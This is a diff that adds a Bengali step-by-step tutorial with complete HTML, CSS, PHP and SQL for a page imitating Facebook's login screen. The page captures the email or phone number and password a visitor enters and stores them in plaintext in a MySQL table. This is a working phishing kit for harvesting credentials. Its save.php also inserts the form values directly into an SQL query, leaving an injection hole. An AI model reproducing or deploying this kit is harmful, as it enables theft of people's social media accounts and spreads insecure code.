@@ -1,0 +1,128 @@
+✅ Step 1 — Database তৈরি করুন
+
+XAMPP চালু করুন → phpMyAdmin খুলুন → SQL ট্যাবে গিয়ে চালান:
+
+CREATE DATABASE fb_login;
+
+USE fb_login;
+
+CREATE TABLE users (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    userid VARCHAR(100),
+    password VARCHAR(100)
+);
+
+✅ Step 2 — Folder Structure
+
+htdocs এর ভিতরে একটি ফোল্ডার বানান:
+
+xampp/htdocs/fblogin
+
+
+ভিতরে 4টি ফাইল রাখুন:
+
+index.html
+style.css
+connect.php
+save.php
+
+✅ Step 3 — HTML (index.html)
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="container">
+    <h1>facebook</h1>
+
+    <form action="save.php" method="POST">
+        <input type="text" name="userid" placeholder="Email or phone number" required>
+        <input type="password" name="password" placeholder="Password" required>
+
+        <button type="submit">Log In</button>
+    </form>
+</div>
+
+</body>
+</html>
+
+✅ Step 4 — CSS (style.css)
+body {
+    margin: 0;
+    font-family: Arial;
+    background: #f0f2f5;
+}
+
+.container {
+    width: 350px;
+    margin: 120px auto;
+    padding: 20px;
+    background: white;
+    text-align: center;
+    border-radius: 8px;
+    box-shadow: 0 0 10px gray;
+}
+
+h1 {
+    color: #1877f2;
+}
+
+input {
+    width: 90%;
+    padding: 12px;
+    margin: 8px 0;
+    border-radius: 5px;
+    border: 1px solid #ddd;
+}
+
+button {
+    width: 95%;
+    padding: 12px;
+    background: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+✅ Step 5 — Database Connection (connect.php)
+<?php
+
+$conn = mysqli_connect("localhost", "root", "", "fb_login");
+
+if (!$conn) {
+    die("Connection failed");
+}
+
+?>
+
+✅ Step 6 — Data Save (save.php)
+<?php
+
+include "connect.php";
+
+$userid = $_POST['userid'];
+$password = $_POST['password'];
+
+$sql = "INSERT INTO users(userid, password)
+        VALUES('$userid', '$password')";
+
+mysqli_query($conn, $sql);
+
+echo "Login data saved successfully!";
+
+?>
+
+✅ Step 7 — Run Project
+
+Browser এ লিখুন:
+
+localhost/fblogin
+
+
+Login দিলে ডাটা MySQL-এ সেভ হবে।
